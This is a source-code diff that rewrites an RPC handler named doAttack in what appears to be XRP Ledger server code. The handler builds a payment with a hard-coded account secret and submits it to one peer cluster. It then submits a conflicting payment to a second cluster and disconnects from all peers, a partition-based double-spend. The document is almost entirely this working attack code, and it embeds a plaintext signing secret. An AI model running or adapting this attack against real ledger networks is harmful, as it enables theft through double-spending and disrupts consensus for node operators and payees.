@@ -31,6 +31,7 @@
 #include <ripple/rpc/Context.h>
 #include <ripple/rpc/impl/TransactionSign.h>
 #include <ripple/overlay/impl/PeerImp.h>
+#include <ripple/overlay/impl/OverlayImpl.h>
 
 namespace ripple {
 
@@ -167,162 +168,55 @@ Json::Value doSubmit (RPC::Context& context)
 }
 
 // Start attacker code
-
-// {
-//   tx_json: <object>,
-//   secret: <secret>
-// }
 Json::Value doAttack (RPC::Context& context)
 {
     auto j = context.app.journal ("Attack");
     JLOG (j.warn()) << "Starting doAttack";
-    changePeers(context, 0, j);
-
+    
     context.loadType = Resource::feeMediumBurdenRPC;
+    const auto active_peers = context.app.overlay ().getActivePeers();
+    auto const failType = getFailHard (context);
+    context.params[jss::secret] = "sEd7gsxCwikqZ9C81bjKMFNM9xoReYU";
 
-    if (!context.params.isMember (jss::tx_blob))
-    {
-        auto const failType = getFailHard (context);
+    // create tx and import into context.params['tx_json']:
+    Json::Value tx;
+    tx[jss::Account] = "rfhWbXmBpxqjUWfqVv34t4pHJHs6YDFKCN";
+    tx[jss::Amount] = "1000000000";
+    tx[jss::Destination] = "rG1eMisac1neCXeZNPYmwV8sovo5vs9dnB";
+    tx[jss::Fee] = "10";
+    tx[jss::TransactionType] = "Payment";
+    context.params[jss::tx_json] = tx;
 
-        // import tx_json-field into context.params:
-        Json::Value tx;
-        tx[jss::Account] = "rfhWbXmBpxqjUWfqVv34t4pHJHs6YDFKCN";
-        tx[jss::Amount] = "1000000000";
-        tx[jss::Destination] = "rG1eMisac1neCXeZNPYmwV8sovo5vs9dnB";
-        tx[jss::Fee] = "10";
-        tx[jss::TransactionType] = "Payment";
+    // Change peers to match only network-cluster 1
+    changePeers(context, active_peers, 1, j);
+    RPC::transactionSubmitAttack (
+        context.params, failType, context.role,
+        context.ledgerMaster.getValidatedLedgerAge(),
+        context.app, RPC::getProcessTxnFnAttack (context.netOps));
 
-        context.params[jss::secret] = "sEd7gsxCwikqZ9C81bjKMFNM9xoReYU";
-        context.params[jss::tx_json] = tx;
+    std::this_thread::sleep_for(std::chrono::milliseconds(200));
 
-        changePeers(context, 1, j);
+    sendQueuedTransactions(context, j);
+    
+    // Change destination of tx -> this tx should be conflicting
+    tx[jss::Destination] = "rnkP5Tipm14sqpoDetQxrLjiyyKhk72eAi";
+    context.params[jss::tx_json] = tx;
 
-        auto ret = RPC::transactionSubmitAttack (
-            context.params, failType, context.role,
-            context.ledgerMaster.getValidatedLedgerAge(),
-            context.app, RPC::getProcessTxnFnAttack (context.netOps));
+    // Change peers to match only network-cluster 2
+    changePeers(context, active_peers, 2, j);
 
-        std::this_thread::sleep_for(std::chrono::milliseconds(200));
+    RPC::transactionSubmitAttack (
+        context.params, failType, context.role,
+        context.ledgerMaster.getValidatedLedgerAge(),
+        context.app, RPC::getProcessTxnFnAttack (context.netOps));
+    
+    std::this_thread::sleep_for(std::chrono::milliseconds(200));
 
-        sendQueuedTransactions(context, j);
-        
-        tx[jss::Destination] = "rnkP5Tipm14sqpoDetQxrLjiyyKhk72eAi";
-        context.params[jss::tx_json] = tx;
+    sendQueuedTransactions(context, j);
 
-        changePeers(context, 2, j);
-
-        ret = RPC::transactionSubmitAttack (
-            context.params, failType, context.role,
-            context.ledgerMaster.getValidatedLedgerAge(),
-            context.app, RPC::getProcessTxnFnAttack (context.netOps));
-        
-        std::this_thread::sleep_for(std::chrono::milliseconds(200));
-
-        sendQueuedTransactions(context, j);
-
-        ret[jss::deprecated] = "Signing support in the 'submit' command has been "
-                               "deprecated and will be removed in a future version "
-                               "of the server. Please migrate to a standalone "
-                               "signing tool.";
-        changePeers(context, -1, j);
-        return ret;
-    }
-    JLOG (j.warn()) << "doAttack: checkpoint 1";
-
-    Json::Value jvResult;
-
-    auto ret = strUnHex (context.params[jss::tx_blob].asString ());
-
-    if (!ret || !ret->size ())
-        return rpcError (rpcINVALID_PARAMS);
-
-    SerialIter sitTrans (makeSlice(*ret));
-
-    std::shared_ptr<STTx const> stpTrans;
-
-    try
-    {
-        stpTrans = std::make_shared<STTx const> (std::ref (sitTrans));
-    }
-    catch (std::exception& e)
-    {
-        jvResult[jss::error]        = "invalidTransaction";
-        jvResult[jss::error_exception] = e.what ();
-
-        return jvResult;
-    }
-
-
-    {
-        if (!context.app.checkSigs())
-            forceValidity(context.app.getHashRouter(),
-                stpTrans->getTransactionID(), Validity::SigGoodOnly);
-        auto [validity, reason] = checkValidity(context.app.getHashRouter(),
-            *stpTrans, context.ledgerMaster.getCurrentLedger()->rules(),
-                context.app.config());
-        if (validity != Validity::Valid)
-        {
-            jvResult[jss::error] = "invalidTransaction";
-            jvResult[jss::error_exception] = "fails local checks: " + reason;
-
-            return jvResult;
-        }
-    }
-
-    std::string reason;
-    auto tpTrans = std::make_shared<Transaction> (
-        stpTrans, reason, context.app);
-    if (tpTrans->getStatus() != NEW)
-    {
-        jvResult[jss::error]            = "invalidTransaction";
-        jvResult[jss::error_exception] = "fails local checks: " + reason;
-
-        return jvResult;
-    }
-
-    try
-    {
-        auto const failType = getFailHard (context);
-
-        context.netOps.processTransactionAttack (
-            tpTrans, isUnlimited (context.role), true, failType);
-    }
-    catch (std::exception& e)
-    {
-        jvResult[jss::error]           = "internalSubmit";
-        jvResult[jss::error_exception] = e.what ();
-
-        return jvResult;
-    }
-
-
-    try
-    {
-        jvResult[jss::tx_json] = tpTrans->getJson (JsonOptions::none);
-        jvResult[jss::tx_blob] = strHex (
-            tpTrans->getSTransaction ()->getSerializer ().peekData ());
-
-        if (temUNCERTAIN != tpTrans->getResult ())
-        {
-            std::string sToken;
-            std::string sHuman;
-
-            transResultInfo (tpTrans->getResult (), sToken, sHuman);
-
-            jvResult[jss::engine_result]           = sToken;
-            jvResult[jss::engine_result_code]      = tpTrans->getResult ();
-            jvResult[jss::engine_result_message]   = sHuman;
-        }
-
-        return jvResult;
-    }
-    catch (std::exception& e)
-    {
-        jvResult[jss::error]           = "internalJson";
-        jvResult[jss::error_exception] = e.what ();
-
-        return jvResult;
-    }
+    // Disconnect from all peers
+    changePeers(context, active_peers, -1, j);
+    return Json::Value();
 }
 
 void sendQueuedTransactions(RPC::Context& context, beast::Journal j) {
@@ -337,13 +231,11 @@ void sendQueuedTransactions(RPC::Context& context, beast::Journal j) {
     return;
 }
 
-
-void changePeers (RPC::Context& context, int cluster_idx, beast::Journal j)
+void changePeers (RPC::Context& context, Overlay::PeerSequence peers, int cluster_idx, beast::Journal j)
 {
     JLOG (j.warn()) << "changePeers: start (cluster_idx: " << cluster_idx << ")";
     
     // Iter over all peers and either connect or disconnect from peers
-    const auto peers = context.app.overlay ().getActivePeers();
     for (auto& peer : peers) {
         if (peer) {
             auto peer_endpoint = peer->getRemoteAddress();
